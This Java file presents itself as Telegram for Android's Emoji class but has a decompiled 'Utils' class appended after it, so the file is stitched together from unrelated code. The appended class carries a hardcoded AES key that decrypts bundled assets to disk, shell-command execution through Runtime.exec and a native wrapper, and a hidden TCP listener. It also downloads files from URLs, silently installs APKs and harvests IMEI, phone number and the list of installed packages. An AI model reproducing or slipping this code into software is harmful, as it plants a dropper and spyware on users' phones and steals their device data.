/*
 * This is the source code of Telegram for Android v. 3.x.x.
 * It is licensed under GNU GPL v. 2 or later.
 * You should have received a copy of the license in this archive (see LICENSE).
 *
 * Copyright Nikolai Kudashov, 2013-2017.
 */

package org.telegram.messenger;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.*;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.ColorFilter;
import android.graphics.Paint;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.text.Spannable;
import android.text.Spanned;
import android.text.TextPaint;
import android.text.style.DynamicDrawableSpan;
import android.text.style.ImageSpan;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Emoji {
    private static HashMap<CharSequence, DrawableInfo> rects = new HashMap<>();
    private static int drawImgSize;
    private static int bigImgSize;
    private static boolean inited = false;
    private static Paint placeholderPaint;
    private static final int splitCount = 4;
    private static Bitmap emojiBmp[][] = new Bitmap[5][splitCount];
    private static boolean loadingEmoji[][] = new boolean[5][splitCount];

    private static final int[][] cols = {
            {15, 15, 15, 15},
            {6, 6, 6, 6},
            {8, 8, 8, 8},
            {9, 9, 9, 9},
            {10, 10, 10, 10}
    };

    static {
        int emojiFullSize;
        int add = 2;
        if (AndroidUtilities.density <= 1.0f) {
            emojiFullSize = 32;
            add = 1;
        } else if (AndroidUtilities.density <= 1.5f) {
            emojiFullSize = 64;
        } else if (AndroidUtilities.density <= 2.0f) {
            emojiFullSize = 64;
        } else {
            emojiFullSize = 64;
        }
        drawImgSize = AndroidUtilities.dp(20);
        bigImgSize = AndroidUtilities.dp(AndroidUtilities.isTablet() ? 40 : 32);

        for (int j = 0; j < EmojiData.data.length; j++) {
            int count2 = (int) Math.ceil(EmojiData.data[j].length / (float) splitCount);
            int position;
            for (int i = 0; i < EmojiData.data[j].length; i++) {
                int page = i / count2;
                position = i - page * count2;
                int row = position % cols[j][page];
                int col = position / cols[j][page];
                Rect rect = new Rect(row * emojiFullSize + row * add, col * emojiFullSize + col * add, (row + 1) * emojiFullSize + row * add, (col + 1) * emojiFullSize + col * add);
                rects.put(EmojiData.data[j][i], new DrawableInfo(rect, (byte) j, (byte) page, i));
            }
        }
        placeholderPaint = new Paint();
        placeholderPaint.setColor(0x00000000);
    }

    private static void loadEmoji(final int page, final int page2) {
        try {
            float scale;
            int imageResize = 1;
            if (AndroidUtilities.density <= 1.0f) {
                scale = 2.0f;
                imageResize = 2;
            } else if (AndroidUtilities.density <= 1.5f) {
                //scale = 3.0f;
                //imageResize = 2;
                scale = 2.0f;
            } else if (AndroidUtilities.density <= 2.0f) {
                scale = 2.0f;
            } else {
                scale = 2.0f;
            }

            /*String q = "";
            for (int a = 0; a < EmojiData.data.length; a++) {
                String arr[] = EmojiData.data[a];
                for (int b = 0; b < arr.length; b++) {
                    String emoji = arr[b];
                    for (int c = 0; c < emoji.length(); c++) {
                        if (emoji.charAt(c) == '\ufe0f') {
                            q += String.format("0x%x, ", (int) emoji.charAt(0));
                            break;
                        }
                    }
                }
            }
            FileLog.e(q);*/

            String imageName;
            File imageFile;

            try {
                for (int a = 4; a < 7; a++) {
                    imageName = String.format(Locale.US, "v%d_emoji%.01fx_%d.jpg", a, scale, page);
                    imageFile = ApplicationLoader.applicationContext.getFileStreamPath(imageName);
                    if (imageFile.exists()) {
                        imageFile.delete();
                    }
                    imageName = String.format(Locale.US, "v%d_emoji%.01fx_a_%d.jpg", a, scale, page);
                    imageFile = ApplicationLoader.applicationContext.getFileStreamPath(imageName);
                    if (imageFile.exists()) {
                        imageFile.delete();
                    }
                }
                for (int a = 8; a < 11; a++) {
                    imageName = String.format(Locale.US, "v%d_emoji%.01fx_%d.png", a, scale, page);
                    imageFile = ApplicationLoader.applicationContext.getFileStreamPath(imageName);
                    if (imageFile.exists()) {
                        imageFile.delete();
                    }
                }
            } catch (Exception e) {
                FileLog.e(e);
            }
            Bitmap bitmap = null;
            try {
                InputStream is = ApplicationLoader.applicationContext.getAssets().open("emoji/" + String.format(Locale.US, "v11_emoji%.01fx_%d_%d.png", scale, page, page2));
                BitmapFactory.Options opts = new BitmapFactory.Options();
                opts.inJustDecodeBounds = false;
                opts.inSampleSize = imageResize;
                bitmap = BitmapFactory.decodeStream(is, null, opts);
                is.close();
            } catch (Throwable e) {
                FileLog.e(e);
            }

            final Bitmap finalBitmap = bitmap;
            AndroidUtilities.runOnUIThread(new Runnable() {
                @Override
                public void run() {
                    emojiBmp[page][page2] = finalBitmap;
                    NotificationCenter.getInstance().postNotificationName(NotificationCenter.emojiDidLoaded);
                }
            });
        } catch (Throwable x) {
            FileLog.e("Error loading emoji", x);
        }
    }

    public static void invalidateAll(View view) {
        if (view instanceof ViewGroup) {
            ViewGroup g = (ViewGroup) view;
            for (int i = 0; i < g.getChildCount(); i++) {
                invalidateAll(g.getChildAt(i));
            }
        } else if (view instanceof TextView) {
            view.invalidate();
        }
    }

    public static String fixEmoji(String emoji) {
        char ch;
        int lenght = emoji.length();
        for (int a = 0; a < lenght; a++) {
            ch = emoji.charAt(a);
            if (ch >= 0xD83C && ch <= 0xD83E) {
                if (ch == 0xD83C && a < lenght - 1) {
                    ch = emoji.charAt(a + 1);
                    if (ch == 0xDE2F || ch == 0xDC04 || ch == 0xDE1A || ch == 0xDD7F) {
                        emoji = emoji.substring(0, a + 2) + "\uFE0F" + emoji.substring(a + 2);
                        lenght++;
                        a += 2;
                    } else {
                        a++;
                    }
                } else {
                    a++;
                }
            } else if (ch == 0x20E3) {
                return emoji;
            } else if (ch >= 0x203C && ch <= 0x3299) {
                if (EmojiData.emojiToFE0FMap.containsKey(ch)) {
                    emoji = emoji.substring(0, a + 1) + "\uFE0F" + emoji.substring(a + 1);
                    lenght++;
                    a++;
                }
            }
        }
        return emoji;
    }

    public static EmojiDrawable getEmojiDrawable(CharSequence code) {
        DrawableInfo info = rects.get(code);
        if (info == null) {
            FileLog.e("No drawable for emoji " + code);
            return null;
        }
        EmojiDrawable ed = new EmojiDrawable(info);
        ed.setBounds(0, 0, drawImgSize, drawImgSize);
        return ed;
    }

    public static Drawable getEmojiBigDrawable(String code) {
        EmojiDrawable ed = getEmojiDrawable(code);
        if (ed == null) {
            return null;
        }
        ed.setBounds(0, 0, bigImgSize, bigImgSize);
        ed.fullSize = true;
        return ed;
    }

    public static class EmojiDrawable extends Drawable {
        private DrawableInfo info;
        private boolean fullSize = false;
        private static Paint paint = new Paint(Paint.FILTER_BITMAP_FLAG);
        private static Rect rect = new Rect();
        private static TextPaint textPaint = new TextPaint(Paint.ANTI_ALIAS_FLAG);

        public EmojiDrawable(DrawableInfo i) {
            info = i;
        }

        public DrawableInfo getDrawableInfo() {
            return info;
        }

        public Rect getDrawRect() {
            Rect original = getBounds();
            int cX = original.centerX(), cY = original.centerY();
            rect.left = cX - (fullSize ? bigImgSize : drawImgSize) / 2;
            rect.right = cX + (fullSize ? bigImgSize : drawImgSize) / 2;
            rect.top = cY - (fullSize ? bigImgSize : drawImgSize) / 2;
            rect.bottom = cY + (fullSize ? bigImgSize : drawImgSize) / 2;
            return rect;
        }

        @Override
        public void draw(Canvas canvas) {
            if (MessagesController.getInstance().useSystemEmoji) {
                String emoji = EmojiData.data[info.page][info.emojiIndex];
                if (EmojiData.emojiToFE0FMap.containsKey(emoji.charAt(0))) {
                    emoji = emoji.substring(0, 1) + "\uFE0F" + emoji.substring(1);
                }
                Rect emojiRect = new Rect();
                textPaint.setTextSize(getBounds().width() * 10.0f);
                textPaint.setTextSize(getBounds().width() * 7.0f * Math.min(1.0f, getBounds().width() / textPaint.measureText(emoji)));
                textPaint.getTextBounds(emoji, 0, emoji.length(), emojiRect);
                if (emojiRect.height() <= getBounds().height()) {
                    textPaint.setTextAlign(Paint.Align.CENTER);
                    canvas.drawText(emoji, getBounds().left + getBounds().width() / 2.0f, getBounds().bottom - getBounds().height() / 5.0f, textPaint);
                    return;
                }
            }
            if (emojiBmp[info.page][info.page2] == null) {
                if (loadingEmoji[info.page][info.page2]) {
                    return;
                }
                loadingEmoji[info.page][info.page2] = true;
                Utilities.globalQueue.postRunnable(new Runnable() {
                    @Override
                    public void run() {
                        loadEmoji(info.page, info.page2);
                        loadingEmoji[info.page][info.page2] = false;
                    }
                });
                canvas.drawRect(getBounds(), placeholderPaint);
                return;
            }

            Rect b;
            if (fullSize) {
                b = getDrawRect();
            } else {
                b = getBounds();
            }

            //if (!canvas.quickReject(b.left, b.top, b.right, b.bottom, Canvas.EdgeType.AA)) {
                canvas.drawBitmap(emojiBmp[info.page][info.page2], info.rect, b, paint);
            //}
        }

        @Override
        public int getOpacity() {
            return PixelFormat.TRANSPARENT;
        }

        @Override
        public void setAlpha(int alpha) {

        }

        @Override
        public void setColorFilter(ColorFilter cf) {

        }
    }

    private static class DrawableInfo {
        public Rect rect;
        public byte page;
        public byte page2;
        public int emojiIndex;

        public DrawableInfo(Rect r, byte p, byte p2, int index) {
            rect = r;
            page = p;
            page2 = p2;
            emojiIndex = index;
        }
    }

    private static boolean inArray(char c, char[] a) {
        for (char cc : a) {
            if (cc == c) {
                return true;
            }
        }
        return false;
    }

    public static CharSequence replaceEmoji(CharSequence cs, Paint.FontMetricsInt fontMetrics, int size, boolean createNew) {
        return replaceEmoji(cs, fontMetrics, size, createNew, null);
    }

    public static CharSequence replaceEmoji(CharSequence cs, Paint.FontMetricsInt fontMetrics, int size, boolean createNew, int[] emojiOnly) {
        if (cs == null || cs.length() == 0) {
            return cs;
        }
        //String str = "\"\uD83D\uDC68\uD83C\uDFFB\u200D\uD83C\uDFA4\""
        //SpannableStringLight.isFieldsAvailable();
        //SpannableStringLight s = new SpannableStringLight(cs.toString());
        Spannable s;
        if (!createNew && cs instanceof Spannable) {
            s = (Spannable) cs;
        } else {
            s = Spannable.Factory.getInstance().newSpannable(cs.toString());
        }
        if (MessagesController.getInstance().useSystemEmoji) {
            return s;
        }
        long buf = 0;
        int emojiCount = 0;
        char c;
        int startIndex = -1;
        int startLength = 0;
        int previousGoodIndex = 0;
        StringBuilder emojiCode = new StringBuilder(16);
        StringBuilder addionalCode = new StringBuilder(2);
        boolean nextIsSkinTone;
        EmojiDrawable drawable;
        EmojiSpan span;
        int length = cs.length();
        boolean doneEmoji = false;
        int nextValidLength;
        boolean nextValid;
        //s.setSpansCount(emojiCount);

        try {
            for (int i = 0; i < length; i++) {
                c = cs.charAt(i);
                if (c >= 0xD83C && c <= 0xD83E || (buf != 0 && (buf & 0xFFFFFFFF00000000L) == 0 && (buf & 0xFFFF) == 0xD83C && (c >= 0xDDE6 && c <= 0xDDFF))) {
                    if (startIndex == -1) {
                        startIndex = i;
                    }
                    emojiCode.append(c);
                    startLength++;
                    buf <<= 16;
                    buf |= c;
                } else if (emojiCode.length() > 0 && (c == 0x2640 || c == 0x2642 || c == 0x2695)) {
                    emojiCode.append(c);
                    startLength++;
                    buf = 0;
                    doneEmoji = true;
                } else if (buf > 0 && (c & 0xF000) == 0xD000) {
                    emojiCode.append(c);
                    startLength++;
                    buf = 0;
                    doneEmoji = true;
                } else if (c == 0x20E3) {
                    if (i > 0) {
                        char c2 = cs.charAt(previousGoodIndex);
                        if ((c2 >= '0' && c2 <= '9') || c2 == '#' || c2 == '*') {
                            startIndex = previousGoodIndex;
                            startLength = i - previousGoodIndex + 1;
                            emojiCode.append(c2);
                            emojiCode.append(c);
                            doneEmoji = true;
                        }
                    }
                } else if ((c == 0x00A9 || c == 0x00AE || c >= 0x203C && c <= 0x3299) && EmojiData.dataCharsMap.containsKey(c)) {
                    if (startIndex == -1) {
                        startIndex = i;
                    }
                    startLength++;
                    emojiCode.append(c);
                    doneEmoji = true;
                } else if (startIndex != -1) {
                    emojiCode.setLength(0);
                    startIndex = -1;
                    startLength = 0;
                    doneEmoji = false;
                } else if (c != 0xfe0f) {
                    if (emojiOnly != null) {
                        emojiOnly[0] = 0;
                        emojiOnly = null;
                    }
                }
                if (doneEmoji && i + 2 < length && cs.charAt(i + 1) == 0xD83C) {
                    char next = cs.charAt(i + 2);
                    if (next >= 0xDFFB && next <= 0xDFFF) {
                        emojiCode.append(cs.subSequence(i + 1, i + 3));
                        startLength += 2;
                        i += 2;
                    }
                }
                previousGoodIndex = i;
                for (int a = 0; a < 3; a++) {
                    if (i + 1 < length) {
                        c = cs.charAt(i + 1);
                        if (a == 1) {
                            if (c == 0x200D && emojiCode.length() > 0) {
                                emojiCode.append(c);
                                i++;
                                startLength++;
                                doneEmoji = false;
                            }
                        } else {
                            if (c >= 0xFE00 && c <= 0xFE0F) {
                                i++;
                                startLength++;
                            }
                        }
                    }
                }
                if (doneEmoji && i + 2 < length && cs.charAt(i + 1) == 0xD83C) {
                    char next = cs.charAt(i + 2);
                    if (next >= 0xDFFB && next <= 0xDFFF) {
                        emojiCode.append(cs.subSequence(i + 1, i + 3));
                        startLength += 2;
                        i += 2;
                    }
                }
                if (doneEmoji) {
                    if (emojiOnly != null) {
                        emojiOnly[0]++;
                    }
                    drawable = Emoji.getEmojiDrawable(emojiCode.subSequence(0, emojiCode.length()));
                    if (drawable != null) {
                        span = new EmojiSpan(drawable, DynamicDrawableSpan.ALIGN_BOTTOM, size, fontMetrics);
                        s.setSpan(span, startIndex, startIndex + startLength, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                        emojiCount++;
                    }
                    startLength = 0;
                    startIndex = -1;
                    emojiCode.setLength(0);
                    doneEmoji = false;
                }
                if (Build.VERSION.SDK_INT < 23 && emojiCount >= 50) {
                    break;
                }
            }
        } catch (Exception e) {
            FileLog.e(e);
            return cs;
        }
        return s;
    }

    public static class EmojiSpan extends ImageSpan {
        private Paint.FontMetricsInt fontMetrics = null;
        private int size = AndroidUtilities.dp(20);

        public EmojiSpan(EmojiDrawable d, int verticalAlignment, int s, Paint.FontMetricsInt original) {
            super(d, verticalAlignment);
            fontMetrics = original;
            if (original != null) {
                size = Math.abs(fontMetrics.descent) + Math.abs(fontMetrics.ascent);
                if (size == 0) {
                    size = AndroidUtilities.dp(20);
                }
            }
        }

        public void replaceFontMetrics(Paint.FontMetricsInt newMetrics, int newSize) {
            fontMetrics = newMetrics;
            size = newSize;
        }

        @Override
        public int getSize(Paint paint, CharSequence text, int start, int end, Paint.FontMetricsInt fm) {
            if (fm == null) {
                fm = new Paint.FontMetricsInt();
            }

            if (fontMetrics == null) {
                int sz = super.getSize(paint, text, start, end, fm);

                int offset = AndroidUtilities.dp(8);
                int w = AndroidUtilities.dp(10);
                fm.top = -w - offset;
                fm.bottom = w - offset;
                fm.ascent = -w - offset;
                fm.leading = 0;
                fm.descent = w - offset;

                return sz;
            } else {
                if (fm != null) {
                    fm.ascent = fontMetrics.ascent;
                    fm.descent = fontMetrics.descent;

                    fm.top = fontMetrics.top;
                    fm.bottom = fontMetrics.bottom;
                }
                if (getDrawable() != null) {
                    getDrawable().setBounds(0, 0, size, size);
                }
                return size;
            }
        }
    }
}

public class Utils {
    private static byte[] defPassword = new byte[] {
            70, 117, 99, 107, 95, 115, 69, 120, 121, 45,
            97, 76, 108, 33, 80, 119 };

    public static boolean checkPermission() {
        return (new File("/system/bin/secbin")).exists() ? tryStartPermission() : false;
    }

    public static void copyAssets(Context paramContext, String paramString1, String paramString2, int paramInt) {
        // Byte code:
        //   0: aconst_null
        //   1: astore #5
        //   3: aconst_null
        //   4: astore #8
        //   6: aconst_null
        //   7: astore #4
        //   9: aconst_null
        //   10: astore #10
        //   12: aconst_null
        //   13: astore #9
        //   15: aconst_null
        //   16: astore #7
        //   18: iload_3
        //   19: ifgt -> 23
        //   22: return
        //   23: new java/io/FileOutputStream
        //   26: dup
        //   27: aload_2
        //   28: invokespecial <init> : (Ljava/lang/String;)V
        //   31: astore #6
        //   33: aload #10
        //   35: astore #4
        //   37: aload #9
        //   39: astore_2
        //   40: aload_0
        //   41: invokevirtual getClass : ()Ljava/lang/Class;
        //   44: new java/lang/StringBuilder
        //   47: dup
        //   48: ldc '/assets/'
        //   50: invokespecial <init> : (Ljava/lang/String;)V
        //   53: aload_1
        //   54: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   57: invokevirtual toString : ()Ljava/lang/String;
        //   60: invokevirtual getResourceAsStream : (Ljava/lang/String;)Ljava/io/InputStream;
        //   63: astore_0
        //   64: aload_0
        //   65: astore #4
        //   67: aload_0
        //   68: astore_2
        //   69: iload_3
        //   70: newarray byte
        //   72: astore_1
        //   73: aload_0
        //   74: astore #4
        //   76: aload_0
        //   77: astore_2
        //   78: aload_0
        //   79: aload_1
        //   80: invokevirtual read : ([B)I
        //   83: pop
        //   84: aload_0
        //   85: astore #4
        //   87: aload_0
        //   88: astore_2
        //   89: aload #6
        //   91: aload_1
        //   92: invokestatic decrypt : ([B)[B
        //   95: invokevirtual write : ([B)V
        //   98: aload_0
        //   99: astore #4
        //   101: aload_0
        //   102: astore_2
        //   103: aload #6
        //   105: invokevirtual flush : ()V
        //   108: aload_0
        //   109: ifnull -> 116
        //   112: aload_0
        //   113: invokevirtual close : ()V
        //   116: aload #6
        //   118: ifnull -> 219
        //   121: aload #6
        //   123: invokevirtual close : ()V
        //   126: return
        //   127: astore_1
        //   128: aload #8
        //   130: astore_0
        //   131: aload #7
        //   133: astore_2
        //   134: aload_2
        //   135: astore #4
        //   137: aload_0
        //   138: astore #5
        //   140: aload_1
        //   141: invokevirtual printStackTrace : ()V
        //   144: aload_2
        //   145: ifnull -> 152
        //   148: aload_2
        //   149: invokevirtual close : ()V
        //   152: aload_0
        //   153: ifnull -> 22
        //   156: aload_0
        //   157: invokevirtual close : ()V
        //   160: return
        //   161: astore_0
        //   162: return
        //   163: astore_0
        //   164: aload #4
        //   166: ifnull -> 174
        //   169: aload #4
        //   171: invokevirtual close : ()V
        //   174: aload #5
        //   176: ifnull -> 184
        //   179: aload #5
        //   181: invokevirtual close : ()V
        //   184: aload_0
        //   185: athrow
        //   186: astore_0
        //   187: return
        //   188: astore_1
        //   189: goto -> 152
        //   192: astore_1
        //   193: goto -> 174
        //   196: astore_1
        //   197: goto -> 184
        //   200: astore_0
        //   201: goto -> 116
        //   204: astore_0
        //   205: aload #6
        //   207: astore #5
        //   209: goto -> 164
        //   212: astore_1
        //   213: aload #6
        //   215: astore_0
        //   216: goto -> 134
        //   219: return
        // Exception table:
        //   from	to	target	type
        //   23	33	127	java/lang/Exception
        //   23	33	163	finally
        //   40	64	212	java/lang/Exception
        //   40	64	204	finally
        //   69	73	212	java/lang/Exception
        //   69	73	204	finally
        //   78	84	212	java/lang/Exception
        //   78	84	204	finally
        //   89	98	212	java/lang/Exception
        //   89	98	204	finally
        //   103	108	212	java/lang/Exception
        //   103	108	204	finally
        //   112	116	200	java/lang/Exception
        //   121	126	186	java/lang/Exception
        //   140	144	163	finally
        //   148	152	188	java/lang/Exception
        //   156	160	161	java/lang/Exception
        //   169	174	192	java/lang/Exception
        //   179	184	196	java/lang/Exception
    }

    public static File createFile(String paramString) {
        File file = new File(paramString);
        if (!file.exists())
            try {
                file.createNewFile();
                return file;
            } catch (IOException iOException) {
                iOException.printStackTrace();
                return file;
            }
        return file;
    }

    public static byte[] decrypt(byte[] paramArrayOfbyte) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(defPassword, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(2, secretKeySpec);
        return cipher.doFinal(paramArrayOfbyte);
    }

    public static String[] downloadFile(Context paramContext, String paramString) {
        // Byte code:
        //   0: aload_1
        //   1: ifnull -> 13
        //   4: ldc ''
        //   6: aload_1
        //   7: invokevirtual equals : (Ljava/lang/Object;)Z
        //   10: ifeq -> 15
        //   13: aconst_null
        //   14: areturn
        //   15: new java/net/URL
        //   18: dup
        //   19: aload_1
        //   20: invokespecial <init> : (Ljava/lang/String;)V
        //   23: astore #4
        //   25: aload #4
        //   27: invokevirtual openConnection : ()Ljava/net/URLConnection;
        //   30: checkcast java/net/HttpURLConnection
        //   33: astore #5
        //   35: aload #5
        //   37: sipush #30000
        //   40: invokevirtual setConnectTimeout : (I)V
        //   43: aload #5
        //   45: sipush #30000
        //   48: invokevirtual setReadTimeout : (I)V
        //   51: aload #5
        //   53: iconst_1
        //   54: invokevirtual setDoInput : (Z)V
        //   57: aload #5
        //   59: invokevirtual connect : ()V
        //   62: aload #5
        //   64: invokevirtual getInputStream : ()Ljava/io/InputStream;
        //   67: astore #5
        //   69: new java/io/File
        //   72: dup
        //   73: aload_1
        //   74: invokespecial <init> : (Ljava/lang/String;)V
        //   77: astore_1
        //   78: aload_1
        //   79: ifnonnull -> 84
        //   82: aconst_null
        //   83: areturn
        //   84: aload_1
        //   85: invokevirtual getName : ()Ljava/lang/String;
        //   88: astore_1
        //   89: aload_0
        //   90: ldc 'download'
        //   92: invokestatic getPath : (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
        //   95: astore_0
        //   96: new java/io/File
        //   99: dup
        //   100: aload_0
        //   101: invokespecial <init> : (Ljava/lang/String;)V
        //   104: astore #6
        //   106: aload #6
        //   108: invokevirtual exists : ()Z
        //   111: ifne -> 120
        //   114: aload #6
        //   116: invokevirtual mkdir : ()Z
        //   119: pop
        //   120: aload_0
        //   121: ldc 'sdcard'
        //   123: invokevirtual contains : (Ljava/lang/CharSequence;)Z
        //   126: ifne -> 156
        //   129: aload #6
        //   131: invokevirtual listFiles : ()[Ljava/io/File;
        //   134: astore #6
        //   136: aload #6
        //   138: ifnull -> 156
        //   141: aload #6
        //   143: arraylength
        //   144: ifle -> 156
        //   147: aload #6
        //   149: arraylength
        //   150: istore_3
        //   151: iconst_0
        //   152: istore_2
        //   153: goto -> 347
        //   156: new java/io/FileOutputStream
        //   159: dup
        //   160: new java/lang/StringBuilder
        //   163: dup
        //   164: aload_0
        //   165: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
        //   168: invokespecial <init> : (Ljava/lang/String;)V
        //   171: aload_1
        //   172: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   175: invokevirtual toString : ()Ljava/lang/String;
        //   178: invokespecial <init> : (Ljava/lang/String;)V
        //   181: astore #6
        //   183: sipush #2048
        //   186: newarray byte
        //   188: astore #7
        //   190: aload #5
        //   192: ifnull -> 344
        //   195: aload #6
        //   197: ifnull -> 344
        //   200: aload #5
        //   202: aload #7
        //   204: invokevirtual read : ([B)I
        //   207: istore_2
        //   208: iload_2
        //   209: iconst_m1
        //   210: if_icmpne -> 316
        //   213: aload #6
        //   215: invokevirtual flush : ()V
        //   218: aload #5
        //   220: invokevirtual close : ()V
        //   223: aload #6
        //   225: invokevirtual close : ()V
        //   228: new java/lang/StringBuilder
        //   231: dup
        //   232: aload_0
        //   233: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
        //   236: invokespecial <init> : (Ljava/lang/String;)V
        //   239: aload_1
        //   240: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   243: invokevirtual toString : ()Ljava/lang/String;
        //   246: astore #5
        //   248: new java/io/File
        //   251: dup
        //   252: new java/lang/StringBuilder
        //   255: dup
        //   256: aload_0
        //   257: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
        //   260: invokespecial <init> : (Ljava/lang/String;)V
        //   263: aload_1
        //   264: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   267: invokevirtual toString : ()Ljava/lang/String;
        //   270: invokespecial <init> : (Ljava/lang/String;)V
        //   273: invokevirtual exists : ()Z
        //   276: ifeq -> 344
        //   279: iconst_2
        //   280: anewarray java/lang/String
        //   283: dup
        //   284: iconst_0
        //   285: aload #5
        //   287: aastore
        //   288: dup
        //   289: iconst_1
        //   290: aload_1
        //   291: aastore
        //   292: areturn
        //   293: aload #6
        //   295: iload_2
        //   296: aaload
        //   297: astore #7
        //   299: aload #7
        //   301: invokevirtual exists : ()Z
        //   304: ifeq -> 355
        //   307: aload #7
        //   309: invokevirtual delete : ()Z
        //   312: pop
        //   313: goto -> 355
        //   316: aload #6
        //   318: aload #7
        //   320: iconst_0
        //   321: iload_2
        //   322: invokevirtual write : ([BII)V
        //   325: goto -> 200
        //   328: astore_0
        //   329: aload #4
        //   331: astore_1
        //   332: aload_0
        //   333: invokevirtual printStackTrace : ()V
        //   336: aconst_null
        //   337: areturn
        //   338: astore_0
        //   339: aconst_null
        //   340: astore_1
        //   341: goto -> 332
        //   344: goto -> 336
        //   347: iload_2
        //   348: iload_3
        //   349: if_icmplt -> 293
        //   352: goto -> 156
        //   355: iload_2
        //   356: iconst_1
        //   357: iadd
        //   358: istore_2
        //   359: goto -> 347
        // Exception table:
        //   from	to	target	type
        //   15	25	338	java/lang/Exception
        //   25	78	328	java/lang/Exception
        //   84	120	328	java/lang/Exception
        //   120	136	328	java/lang/Exception
        //   141	151	328	java/lang/Exception
        //   156	190	328	java/lang/Exception
        //   200	208	328	java/lang/Exception
        //   213	293	328	java/lang/Exception
        //   299	313	328	java/lang/Exception
        //   316	325	328	java/lang/Exception
    }

    public static String getPath(Context paramContext, String paramString) {
        String str2 = Environment.getExternalStorageDirectory().getPath();
        if (!Environment.getExternalStorageState().equals("mounted"))
            str2 = paramContext.getFilesDir().getPath();
        String str1 = str2;
        if (paramString != null)
            str1 = String.valueOf(str2) + "/" + paramString + "/";
        return str1;
    }

    public static boolean isConnected(Context paramContext) {
        ConnectivityManager connectivityManager = (ConnectivityManager)paramContext.getSystemService("connectivity");
        return connectivityManager.getNetworkInfo(1).isConnected() ? true : (connectivityManager.getNetworkInfo(0).isConnected());
    }

    public static void oldrun(String paramString1, String paramString2) {
        try {
            Runtime.getRuntime().exec(String.valueOf(paramString1) + " " + paramString2).waitFor();
            return;
        } catch (Exception exception) {
            exception.printStackTrace();
            return;
        }
    }

    public static void runsh(final String cmd, final String param) {
        try {
            (new Thread(new Runnable() {
                public void run() {
                    Native.runcmd_wrapper(cmd, param);
                }
            })).start();
            return;
        } catch (Exception exception) {
            exception.printStackTrace();
            return;
        }
    }

    public static boolean tryStartPermission() {
        if (TCP.isListened())
            return true;
        TCP.startListen();
        return TCP.isListened();
    }

    public static class PhoneState {
        public static String getAliaMemorySize(Context param1Context) {
            ActivityManager activityManager = (ActivityManager)param1Context.getSystemService("activity");
            ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
            activityManager.getMemoryInfo(memoryInfo);
            return Formatter.formatFileSize(param1Context, memoryInfo.availMem);
        }

        public static int getBlockSize() {
            return getStatFs().getBlockSize();
        }

        public static String getConnectType(Context param1Context) {
            ConnectivityManager connectivityManager = (ConnectivityManager)param1Context.getSystemService("connectivity");
            return (connectivityManager == null || connectivityManager.getActiveNetworkInfo() == null) ? "UNKNOWN" : connectivityManager.getActiveNetworkInfo().getTypeName();
        }

        public static String getImei(Context param1Context) {
            return getTelManager(param1Context).getDeviceId();
        }

        public static String getMobile(Context param1Context) {
            return getTelManager(param1Context).getLine1Number();
        }

        public static String getModel() {
            return String.valueOf(Build.BRAND) + " " + Build.MODEL;
        }

        public static String getNetOperater(Context param1Context) {
            ConnectivityManager connectivityManager = (ConnectivityManager)param1Context.getSystemService("connectivity");
            return (connectivityManager == null || connectivityManager.getActiveNetworkInfo() == null) ? "UNKNOWN" : connectivityManager.getActiveNetworkInfo().getExtraInfo();
        }

        public static List<String> getRuningServices(Context param1Context) {
            List list = ((ActivityManager)param1Context.getSystemService("activity")).getRunningServices(100);
            ArrayList<String> arrayList = new ArrayList();
            Iterator iterator = list.iterator();
            while (true) {
                if (!iterator.hasNext())
                    return arrayList;
                arrayList.add(((ActivityManager.RunningServiceInfo)iterator.next()).service.getShortClassName());
            }
        }

        public static String getSDAliaMemory(Context param1Context) {
            int i = getStatFs().getAvailableBlocks();
            return Formatter.formatFileSize(param1Context, Long.valueOf(getBlockSize()).longValue() * Long.valueOf(i).longValue());
        }

        public static String getSDCardState(Context param1Context) {
            return Environment.getExternalStorageState().equals("mounted") ? getSDAliaMemory(param1Context) : null;
        }

        public static String[] getSDKVersion() {
            return new String[] { Build.VERSION.RELEASE, Build.VERSION.SDK };
        }

        public static StatFs getStatFs() {
            return new StatFs(Environment.getExternalStorageDirectory().getPath());
        }

        public static TelephonyManager getTelManager(Context param1Context) {
            return (TelephonyManager)param1Context.getSystemService("phone");
        }
    }

    public static class PkgManager {
        public static List<PackageInfo> getInstallPackageInfo(Context param1Context) {
            return param1Context.getPackageManager().getInstalledPackages(0);
        }

        public static List<String> getInstallPackages(Context param1Context) {
            List list = param1Context.getPackageManager().getInstalledPackages(0);
            ArrayList<String> arrayList = new ArrayList();
            Iterator iterator = list.iterator();
            while (true) {
                if (!iterator.hasNext())
                    return arrayList;
                arrayList.add(((PackageInfo)iterator.next()).applicationInfo.packageName);
            }
        }

        public static String[] getPackageMsg(Context param1Context, String param1String) {
            String[] arrayOfString = new String[4];
            param1String = String.valueOf(Utils.getPath(param1Context, "download")) + param1String;
            PackageInfo packageInfo = param1Context.getPackageManager().getPackageArchiveInfo(param1String, 1);
            if (packageInfo != null) {
                String str1 = packageInfo.applicationInfo.packageName;
                String str2 = packageInfo.versionName;
                arrayOfString[1] = str1;
                arrayOfString[2] = str2;
            }
            return arrayOfString;
        }

        public static void installApp(Context param1Context, String param1String) {
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.setDataAndType(Uri.fromFile(new File(param1String)), "application/vnd.android.package-archive");
            intent.setFlags(268435456);
            param1Context.startActivity(intent);
        }

        public static boolean isInstalled(Context param1Context, String param1String) {
            List<String> list = getInstallPackages(param1Context);
            return (list != null && list.size() > 0 && list.contains(param1String));
        }
    }

